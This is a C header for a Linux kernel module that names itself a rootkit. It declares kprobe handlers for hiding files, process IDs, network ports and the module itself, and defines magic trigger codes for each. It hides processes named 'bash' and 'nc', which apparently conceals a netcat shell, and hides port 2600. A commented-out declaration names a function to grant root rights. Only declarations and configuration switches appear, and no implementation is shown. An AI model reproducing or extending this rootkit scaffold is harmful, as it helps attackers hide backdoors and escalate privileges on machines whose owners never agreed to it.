#ifndef MAIN_H
#define MAIN_H
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/namei.h>
#include <linux/dcache.h>
#include <linux/fs.h>
#include <linux/notifier.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <asm/desc.h>
#include <asm/ptrace.h>


#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#define FILE_HIDE_C 0
#define LKM_HIDE_C 0
#define PID_HIDE_C 0
#define PORT_HIDE_C 0


#define CODE_HIDE_PID 0xde
#define CODE_HIDE_PATH 0xad
#define CODE_LKM_HIDE 0xbe
#define CODE_PORT_HIDE 0xef

#if PORT_HIDE_C
#include <linux/tcp.h>
#endif

#define HOOK_FILLDIR (FILE_HIDE_C || PID_HIDE_C)



#ifdef DEBUG
#define dbg_print(fmt, ...) pr_info(fmt, ##__VA_ARGS__)
#else
#define dbg_print(fmt, ...) /* No-op */
#endif


#if FILE_HIDE_C
void file_hide_handler(struct kprobe *p, struct pt_regs *regs);
#endif
#if PID_HIDE_C

#define HIDE_CMD1 "bash"
#define HIDE_CMD2 "nc"
#define MAX_PIDS 10
void pid_hide_handler(struct kprobe *p, struct pt_regs *regs);

#endif

#if PORT_HIDE_C

#define HIDE 2600
void port_hide_handler(struct kprobe *p, struct pt_regs *regs);
#endif


static int __init rootkit_init(void);
static void __exit rootkit_initexit(void);

// static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs);
// static int grant_root_rights(pid_t pid);
#endif

